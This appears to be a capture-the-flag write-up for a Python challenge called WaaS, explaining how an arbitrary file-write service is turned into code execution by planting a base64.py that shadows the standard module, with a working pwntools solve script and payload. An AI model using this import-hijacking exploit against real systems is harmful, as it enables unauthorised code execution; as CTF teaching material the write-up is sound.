+++
title = 'WaaS'
date = 2024-08-06T11:27:07+02:00
tags = [
  "Misc",
  "Python",
  "491 points",
  "78 solves",
  "NoobMaster + NoobHacker"
]
draft = true
+++

<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Waas</h1>

**Description**: Writing as a Service!

## Introduction

WaaS (Writing as a Service) allows us to overwrite a file on the system (after some input validation) and insert anything (until a newline is met) we want in it.

```python
import subprocess
from base64 import b64decode as d
while True:
        print("[1] Write to a file\n[2] Get the flag\n[3] Exit")
        try:
                inp = int(input("Choice: ").strip())
        except:
                print("Invalid input!")
                exit(0)
        if inp == 1:
                file = input("Enter file name: ").strip()
                assert file.count('.') <= 2 # Why do you need more?
                assert "/proc" not in file # Why do you need to write there?
                assert "/bin" not in file # Why do you need to write there?
                assert "\n" not in file # Why do you need these?
                assert "chall" not in file # Don't be overwriting my files!
                try:
                        f = open(file,'w')
                except:
                        print("Error! Maybe the file does not exist?")

                f.write(input("Data: ").strip())
                f.close()
                print("Data written sucessfully!")

        if inp == 2:
                flag = subprocess.run(["cat","fake_flag.txt"],capture_output=True) # You actually thought I would give the flag?
                print(flag.stdout.strip())
```

## Solution

At first one may think of trying to bypass the input validation to perhaps rewrite the workings of the cat command or the challenge file itself, but this isn't possible.
Something very bizarre is the imported but unused `b64decode` from the `base64` module, which is what allows us to solve the challenge.
When python imports modules it looks in `sys.path`, which has a list of valid directories to import modules from. After a quick scan through the [python3 docs](https://docs.python.org/3/library/sys_path_init.html) we find out that the first directory it looks through is the same directory the file is in, this means that if we have a `base64.py` file in the directory then python will try to import a `b64decode` symbol from that file instead of the common known module.
One more feature of python's import behavior we can use is the that all the code in an imported module will be executed. For example if a file `test.py` has `print('Hello, World!')` and it can be executed (for example if it's at the lowest indentation level) then a file with `import test` will indeed see `Hello, World!` printed to `stdout`.
Therefore, since the `open` function with a `'w'` flag will create a file if it does not exist, we can simply create a file named `base64.py` and write our malicious code in it.
Something like this will do the trick:

```python
import os; b64decode = 0; os.system("cat flag.txt")
```

But the flag isn't our yet; we need to use the fact that the instance does not reset its files every time we connect to it, which means that our `base64.py` will remain in the directory for the lifetime of the instance. This means we simply need to reconnect to it and get our flag.

`solve.py`

```python
from pwn import *

def solve():
  r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance

  r.sendlineafter(b'Choice: ', b'1') # 1 to write a file
  r.sendlineafter(b'Enter file name: ', b'base64.py')
  r.sendlineafter(b'Data: ', b'import os; b64decode = 0; os.system("cat flag.txt")')

  r.close()

  r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance
  flag = r.recvline().decode()
  print(f'flag: {flag}')
  r.close()

if __name__ == '__main__':
  solve()
```

```
$ flag: n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_f5c63f47af0e}
```

<p align="right">Author: vympel</p>
